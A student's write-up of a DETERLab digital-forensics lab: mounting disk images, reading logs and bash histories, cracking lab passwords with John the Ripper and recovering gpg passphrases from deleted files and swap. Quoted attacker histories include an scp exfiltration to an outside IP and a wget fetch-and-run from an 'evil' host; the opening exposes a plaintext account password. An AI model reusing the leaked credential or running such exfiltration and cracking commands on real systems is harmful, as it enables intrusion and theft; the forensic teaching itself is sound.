# Lab 3

## SSH

Login to DETERLab as an user:

```bash
ssh la136cr@users.deterlab.net
```

The password is: `kKpM8Mki!FPkig!`

Then you can ssh to experiment instance:

```bash
ssh workbench.la136cr-lab3.UCLA136.isi.deterlab.net
```

## Reset Mounting

```bash
sudo losetup -d /dev/loop1
sudo umount /dev/loop0
sudo losetup -d /dev/loop0
```

## Act I: The University Server

Incident: There was a huge spike in Internet traffic which occurred at 4 in the morning.

Follow the instructions for loadimage.sh to load a disk image. loadimage.sh will copy the dd image from a network server to your workbench machine, but you'll still have to mount it.

```bash
cd /images
sudo ./loadimage.sh act1.img
```

Use losetup and mount to mount the partitions. there are sda1 and sda2 directories in the /images directory; these are meant for you to mount the first and second partitions of the disk (root and swap).

```bash
sudo losetup /dev/loop0 act1.img -o 32256
sudo mount /dev/loop0 sda1
sudo losetup /dev/loop1 act1.img -o 1497000960
```

Check for deleted files.

```bash
sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
```

There are no recently deleted files. Move on.

First, check if the system is compromised. Cat the files inside `/images/sda1/var/log` directory. There aren't any notable information. Besides, all the logs are recent and there are no logs around 4 in the morning. So it's hard to say whether or not the system is compromised.

Second, check if the suspicious traffic is caused by users: Go to `/images/sda1/home`. Cat each user's `.bash_history` file. Looks like user `kevin` is doing some suspicious activity. In particular:

```bash
echo "0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" "~/music"" | crontab -
```

`crontab` is used to schedule a task. Syntax breakdown:

- `0 4 * * *` -- specifies when to run the task in the format of `[minute] [hour] [day of month] [month] [day of week]`. In this case, it means to run the task at 4 o'clock every day.
- `rsync` -- a command to copy remote files
- `a` -- recursive copy
- `q` -- supress output from remote server
- `--del` -- the receiver side deletes files incrementally
- `-e, --rsh=COMMAND` -- specifies the remote shell command to use

So every day at 4 o'clock, we are ssh into `kevin.dynip.com` and copy all the files from `My_Music` directory remotely into `music` directory locally. This is very likely the cause of Internet traffic spiked observed at 4 in the morning.

Third, to verify that `kevin`'s cron job was indeed the issue, check the size of `music` directory:

```bash
du -h music
```

It turns out the `music` directory has size 280M. This is huge!

So the server is most likely not compromised. The Internet traffic spike was caused by kevin's cron job downloading a lot of large music files.

- whether you think the server was indeed compromised

  - if so, how? if not, what actually happened?
  - give a blow-by-blow account if possible -- the more detail, the better!

```
No the server was not compromised. See above.
```

- whether you think the attacker accessed any sensitive information

```
Since there is no attacker, no sensitive information is leaked.
```

- your recovery of any meaningful data

```
No meaningful data is lost.
```

- a discussion of what should be done before returning the system to production

  - For example, is it good enough to delete the obvious files? Could the system be trojaned?

```
Nothing needs to be done because the machine is not compromised.
```

- recommendations as to how they can keep this from happening again

```
Warn kevin not to do this.
```

- an estimate on how long this assignment took you

```
3 hours.
```

## Act II: The Missing Numbers

Incident: A protected spreadsheet chock full of secret numbers is stolen, possibly by an user with IP address 207.92.30.41 at the time.

```bash
cd /images
sudo ./loadimage.sh act2.img
sudo losetup /dev/loop0 act2.img -o 32256
sudo mount /dev/loop0 sda1 -t ext2
sudo losetup /dev/loop1 act2.img -o 1497000960
```

Check for deleted files.

```bash
sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
```

There are many deleted files! But unfortunately, none of them were recoverable and threw segmentation fault during recovering process.

Check for logs.

```bash
cd /images/sda1/var/log
cat auth.log | less
cat kern.log | less
cat syslog | less
```

`auth.log` looks pretty suspicious. In particular:

```
...
Sep 10 03:56:41 yoyodyne PAM_unix[2214]: authentication failure; (uid=0) -> john for ssh service
Sep 10 03:56:43 yoyodyne sshd[2214]: Failed password for john from 193.252.122.103 port 33018 ssh2
Sep 10 03:56:50 yoyodyne last message repeated 2 times
Sep 10 03:56:50 yoyodyne PAM_unix[2214]: 2 more authentication failures; (uid=0) -> john for ssh service
...
Sep 10 03:57:36 yoyodyne PAM_unix[2216]: authentication failure; (uid=0) -> fred for ssh service
Sep 10 03:57:38 yoyodyne sshd[2216]: Failed password for fred from 193.252.122.103 port 33019 ssh2
Sep 10 03:57:58 yoyodyne last message repeated 2 times
Sep 10 03:57:58 yoyodyne PAM_unix[2216]: 2 more authentication failures; (uid=0) -> fred for ssh service
...
Sep 10 03:59:45 yoyodyne PAM_unix[2227]: authentication failure; (uid=0) -> mike for ssh service
Sep 10 03:59:47 yoyodyne sshd[2227]: Failed password for mike from 193.252.122.103 port 57719 ssh2
Sep 10 03:59:55 yoyodyne last message repeated 2 times
Sep 10 03:59:55 yoyodyne PAM_unix[2227]: 2 more authentication failures; (uid=0) -> mike for ssh service
...
Sep 10 04:04:59 yoyodyne PAM_unix[2266]: authentication failure; mike(uid=1002) -> root for su service
Sep 10 04:05:02 yoyodyne su[2266]: pam_authenticate: Authentication failure
...
Sep 10 04:20:33 yoyodyne su[2650]: + pts/0 mike-root
Sep 10 04:20:33 yoyodyne PAM_unix[2650]: (su) session opened for user root by mike(uid=1002)
Sep 10 04:21:05 yoyodyne groupadd[2654]: new group: name=jake, gid=1006
Sep 10 04:21:05 yoyodyne useradd[2655]: new user: name=jake, uid=1006, gid=1006, home=/home/jake, shell=/bin/bash
...
```

`john`, `fred`, and `mike` entered incorrect login passwords repeatedly. Then it looks like their passwords are cracked shortly after. Finally, a new user `jake` is added to the system by `root` through `mike`.

Let's check what commands were executed under those suspicious users.

```bash
# /images/sda1/home/john/.bash_history does not exist
cat /images/sda1/home/fred/.bash_history | less
cat /images/sda1/home/mike/.bash_history | less
cat /images/sda1/root/.bash_history | less
```

The `.bash_history` of `mike` and `root` seem particularly interesting. Looks like `mike` installed John the Ripper password cracker and tried to crack `/etc/passwd` file.

```
...
cp /etc/passwd calendar.txt
...
./john calendar.txt
```

Let's see if it actually worked out.

```bash
sudo apt-get install john
unshadow /images/sda1/etc/passwd /images/sda1/etc/shadow > mypasswd
john mypasswd
```

Here's the output:

```
Loaded 8 password hashes with 8 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (mike)
password         (guest)
tuesday2         (root)
baseball8        (fred)
...
```

Ah-hah! No wonder `mike`'s password was cracked so easily. And the attacker was able to get the password of `root` and created a new user `jake`. Let's see what they did with `jake`.

Check the `.bash_history`.

```bash
cat /images/sda1/home/jake/.bash_history | less
```

The output:

```
cp -r /secrets .
ls
scp -r secrets d000d@207.92.30.41   :~/
ls
mv secrets .elinks
ls
ls -alh
```

There we go! `jake` remotely copied all the files in `secrets` directory to the kid's IP address `207.92.30.41`. So it's resonable to conclude that this kid is responsible for the exploit.

- whether you think the server was indeed compromised

  - if so, how? if not, what actually happened?
  - give a blow-by-blow account if possible -- the more detail, the better!

```
The server was compromised. See above.
```

- whether you think the attacker accessed any sensitive information

```
The attacker stole data inside the `secrets` directory.
```

- your recovery of any meaningful data

```
No meaningful data was recovered.
```

- a discussion of what should be done before returning the system to production
  - For example, is it good enough to delete the obvious files? Could the system be trojaned?

```
All the users including `root` must have stronger passwords.
```

- recommendations as to how they can keep this from happening again

```
Tell the users to use a password generator.
```

- an estimate on how long this assignment took you

```
3 hours.
```

## Act III: The Wealthy Individual

Incident: Swiss bank account access codes are encrypted by attacker. Retrieve the codes.

```bash
cd /images
sudo ./loadimage.sh act3.img
sudo losetup /dev/loop0 act3.img -o 32256
sudo mount /dev/loop0 sda1
sudo losetup /dev/loop1 act3.img -o 1497000960
```

Check for deleted files.

```bash
sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
```

Here's the output:

```
searching for deleted inodes on /dev/loop0:
|==================================================|
731752 inodes scanned, 2846 deleted files found

   user name | 1 <12 h | 2 <48 h | 3  <7 d | 4 <30 d | 5  <1 y | 6 older
-------------+---------+---------+---------+---------+---------+--------
        root |       0 |       0 |       0 |       0 |       0 |    2841
        1001 |       0 |       0 |       0 |       0 |       0 |       5
```

Only the files of user `1001` were able to be recovered.

- inode-368000-ASCII_text
- inode-368001-ASCII_text
- inode-368002-ASCII_text
- inode-368003-ASCII_text
- inode-703144-application_core

Let's see what we can find from those deleted files.

```bash
cat inode-368000-ASCII_text | less
cat inode-368001-ASCII_text | less
cat inode-368002-ASCII_text | less
cat inode-368003-ASCII_text | less
cat inode-703144-application_core | less
```

`inode-368000-ASCII_text`, `inode-368001-ASCII_text`, and `inode-368002-ASCII_text` contained something potentially meaningful.

- 7 17jonquil23scent14
- 8 26daisy99daisy99
- 6 13tulip34root28

`inode-368003-ASCII_text` looks like `.bash_history` file.

```
ls -alh
mkdir .mozilla
mkdir .thunderbird
mkdir .games
cd swiss_keys/
ls
for i in *; do vi $i; done
whoami
wget
wget http://eeeevilcode.com/extortomatic-hidekey
wget http://eeeevilcode.com/extortomatic-keyhider
cd /home/rich
wget http://eeeevilcode.com/extortomatic-keyhider
ls
chmod u+x extortomatic-keyhider
vi extortomatic-keyhider
./extortomatic-keyhider
ls
cd swiss_keys/
ls
gpg --symmetric swisskey1
cd ..
ls
ls -alh
chown rich:rich -R *
ls
ls -alh
cd swiss_keys/
gpg --symmetric swisskey1
ls
shred swisskey1
man shred
ls
rm swisskey1
gpg --symmetric swisskey2
shred -u swisskey2
gpg --symmetric swisskey3
shred -u swisskey3
gpg --symmetric swisskey4
shred -u -z swisskey4
touch swisskey4
shred -u swisskey4
gpg --symmetric swisskey5
shred -u swisskey5
gpg --symmetric swisskey6
shred -u swisskey6
gpg --symmetric swisskey7
shred -u swisskey7
gpg --symmetric swisskey8
shred -u swisskey8
ls
cd ../documents/
ls
shred -u -z *
cd ..
rm -rf documents/
su -
```

Most likely, this is user `rich`'s `.bash_history`. Indeed, `.bash_history` does not exist in `/images/sda1/home/rich` directory. We see `rich` is the one who encrypted those 8 bank codes we are trying to decrypt. `rich` is one of the people who is responsible for the attack. Either `rich` was involved in the attack or his account is compromised (as you will see later, `rich`'s password can be cracked using `john`).

Check the `/var/log` directory. Nothing interesting found.

Now let's try to see if we can crack the passphrase.

```bash
cd /images/sda1/home/rich/swiss_keys
gpg swisskey8.gpg
gpg swisskey7.gpg
gpg swisskey6.gpg
```

The deleted files we recovered looked a lot like passphrases. It turns out they are! Here are the decrypted swisskeys.

```bash
cat swisskey8
cat swisskey7
cat swisskey6
```

The output:

```
goodness_gracious_great_balls_of_fire
twist_again_like-we_did_last_summer
raindrops_keep_fallin_on_my_head
```

Digging through the directories, I found

- 4 11hibiscus2hibiscus23 (at `/images/sda1/home/rich/.extrtmtc/key4`)
- 5 19rose42blossom35 (at `/images/sda1/home/rich/.mozilla/cache/a234Z8x0`)
- 1 23philo7dendron88 (at `/images/sda1/tmp/extortomatic-23421/key1`)

Check if those passphrases work.

```bash
cd /images/sda1/home/rich/swiss_keys
gpg swisskey4.gpg
gpg swisskey5.gpg
gpg swisskey1.gpg
```

They worked! Here's the outputs using `cat`.

```
im_pickin_up_good_vibrations
its_the_little_old_lady_from_pasadena
me_and_you_and_you_and_me-so_happy_2gether
```

Wherelse can the key go? Well, we have not checked the swap space (i.e. `/dev/loop1`).

```bash
strings /dev/loop1 | less
```

Now, this is overwhelming. Based on the pattern we've seen so far, we are looking for something of these forms:

```
2 [a-zA-Z0-9]{10,30}
3 [a-zA-Z0-9]{10,30}
```

So we can filter the output with `grep` as follows:

```bash
strings /dev/loop1 | grep -E '2 [a-zA-Z0-9]{10,30}'
strings /dev/loop1 | grep -E '3 [a-zA-Z0-9]{10,30}'
```

The first command gives you:

```
key2 41jade6tree29p
key2 41jade6tree29~~~
Creating bzip2 compressed archives is not currently supported.
PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
VFS: Can't find an ext2 filesystem on dev hdc.
VFS: Can't find an ext2 filesystem on dev hdc.
VFS: Can't find an ext2 filesystem on dev loop0.
```

The second command gives you:

```
key 3 29azalea8flower00
```

The password of swisskey3 worked. But the password of swisskey2 needed a little bit of a twist. It turns out the password is not `41jade6tree29p`, nor `41jade6tree29~~~`, but just `41jade6tree29`. Decrypt the files and cat them:

```
everybody_dance_now_hey_now
what_would_you_do_if_sang_out_of_tune
```

In conclusion, here's the keys of the 8 bank codes:

```
bank code 1: me_and_you_and_you_and_me-so_happy_2gether
bank code 2: everybody_dance_now_hey_now
bank code 3: what_would_you_do_if_sang_out_of_tune
bank code 4: im_pickin_up_good_vibrations
bank code 5: its_the_little_old_lady_from_pasadena
bank code 6: raindrops_keep_fallin_on_my_head
bank code 7: twist_again_like-we_did_last_summer
bank code 8: goodness_gracious_great_balls_of_fire
```

- whether you think the server was indeed compromised
  - if so, how? if not, what actually happened?
  - give a blow-by-blow account if possible -- the more detail, the better!

```
See above.
```

- whether you think the attacker accessed any sensitive information

```
The attacker accessed the bank code.
```

- your recovery of any meaningful data

```
We recovered the passphrases to decrypt some of the bank codes. We also found a .bash_history of the compromised user rich.
```

- a discussion of what should be done before returning the system to production

  - For example, is it good enough to delete the obvious files? Could the system be trojaned?

```
First, the bank codes need to be rotated (i.e. renewed). Second, users must have stronger passwords. Interrogate rich and see if he knows anything. Change the owner of swiss_keys directory to root so only root can access it.
```

- recommendations as to how they can keep this from happening again

```
Tell the users to change their passwords and use a strong password generator.
```

- an estimate on how long this assignment took you

```
1 day.
```

## Extra Credit

Just run `john` for a long time:

```bash
unshadow /images/sda1/etc/passwd /images/sda1/etc/shadow > mypasswd
john mypasswd
```

You will get this after a while:

```
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
butler           (jeeves)
moneymoney       (root)
plants           (gardener)

```

At this point, you would realize rest of the passwords are probably some English words, and not a random sequence of characters. So to optimize the process, we can use wordlist.

```bash
wget https://download.openwall.net/pub/wordlists/all.gz
gzip -d all.gz
john --wordlist=all --rules mypasswd
```

After a while, you will get this:

```
Remaining 3 password hashes with 3 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
food             (chef)
moneybags        (rich)

```

We have successfully recovered 5 user passwords! The password of `ubuntu` user is unknown, but this is an artifact of DETERLab. If you look at the owner and group of `/images/sda1/home/ubuntu` directory, it is owned by `deter`. So we can ignore `ubuntu` user because it should not exist.

All 8 missing bank keys are recovered in previous section:

```
bank code 1: me_and_you_and_you_and_me-so_happy_2gether
bank code 2: everybody_dance_now_hey_now
bank code 3: what_would_you_do_if_sang_out_of_tune
bank code 4: im_pickin_up_good_vibrations
bank code 5: its_the_little_old_lady_from_pasadena
bank code 6: raindrops_keep_fallin_on_my_head
bank code 7: twist_again_like-we_did_last_summer
bank code 8: goodness_gracious_great_balls_of_fire
```
